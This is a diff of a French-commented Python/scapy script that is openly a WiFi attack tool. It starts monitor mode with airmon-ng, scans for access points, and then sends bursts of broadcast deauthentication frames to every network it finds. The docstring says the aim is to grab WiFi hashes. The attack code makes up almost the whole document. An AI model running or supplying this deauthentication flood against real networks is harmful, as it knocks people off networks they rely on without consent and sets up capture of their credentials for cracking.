@@ -12,6 +12,13 @@ chopper le hash wifi
 
 """
 
+packet_sniff_timeout = 10
+deauth_packets = 100
+
+
+
+
+
 def main():
     print("""
 
@@ -47,10 +54,20 @@ if len(sys.argv) > 2:
     interface = sys.argv[0]
     wlanmon = sys.argv[1]
 
+# mode Monitor
+#os.system(f"ifconfig {interface} down")
+#os.system(f"iwconfig {interface} mode monitor")
+#os.system(f"ifconfig {interface} up")
+os.system("airmon-ng check kill")
+os.system(f"airmon-ng start {interface} > /dev/null") # > /dev/null pour 0 output
+
 
 # Fonction pour scanner les réseaux WiFi
 def scan_wifi_networks():
+    global bssid_list, ssid_list
     networks = []
+    bssid_list = []
+    ssid_list = []
     ssid_set = set()
 
     # Fonction de rappel pour chaque paquet reçu
@@ -63,14 +80,11 @@ def scan_wifi_networks():
             if bssid not in ssid_set:
                 ssid_set.add(bssid)
                 networks.append((bssid, ssid, channel))
-
-    # mode Monitor
-    os.system(f"ifconfig {interface} down")
-    os.system(f"iwconfig {interface} mode monitor")
-    os.system(f"ifconfig {interface} up")
-
+                bssid_list.append(bssid)
+                ssid_list.append(ssid)
+                
     # Capture des paquets WiFi
-    sniff(iface=f"{wlanmon}", prn=packet_handler, timeout=2) #a voir si j'abuse pas avec mon timeout de ouf mais 3 ça suffit laaargge
+    sniff(iface=f"{wlanmon}", prn=packet_handler, timeout=packet_sniff_timeout)
 
     return networks
 
@@ -89,21 +103,22 @@ display_wifi_networks(networks)
 
 #prise d'infos (client pour deauth)
 if bssid != False:
-    for bssid in networks:
+    for mac in bssid_list: 
+        
         #pas besoin d'avoir le MAC du client pour deauth...
 
-        def deauth_wifi(bssid, interface):
+        def deauth_wifi(mac, interface):
             #construction de la requete deauth, avec la MAC de broadcast
 
-            packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid)/Dot11Deauth()
+            packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=mac, addr3=mac)/Dot11Deauth()
 
-            print("[+] DeAuth for {ssid} with MAC : {bssid}")
+            print(f"[+] DeAuth for MAC : {mac}")
 
-            sendp(packet, iface=interface, count=100, inter=0.1, verbose=1)
+            sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1)
 
-        # BOOM wifi deauth
+            # BOOM wifi deauth
 
-        deauth_wifi(bssid, interface)
+        deauth_wifi(mac, interface)
 
 else:
     print("[-] No wifi hotspot found !")
@@ -113,7 +128,4 @@ else:
 
 
 # kill monitor mode
-os.system(f"ifconfig {wlanmon} down")
-os.system(f"iwconfig {wlanmon} mode managed")
-os.system(f"ifconfig {wlanmon} up")
-
+os.system(f"airmon-ng stop {interface} > /dev/null ")
